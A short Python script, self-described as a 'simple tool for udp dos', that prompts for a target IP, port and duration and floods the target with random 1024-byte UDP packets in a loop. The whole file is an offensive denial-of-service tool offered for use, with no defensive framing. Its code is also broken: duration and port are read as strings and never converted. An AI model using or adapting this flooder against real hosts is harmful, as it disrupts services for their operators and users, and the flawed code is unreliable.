import os
import sys
import time
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
print('This is a simple tool for udp dos')
ip = input('Target ip or url:')
port = input('port:')
dur = input("Time:")
timeout = time.time() + dur
sent = 0
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        #print("Sent %s packets to %s" %(sent, ip))
    except KeyboardInterrupt:
        sys.exit()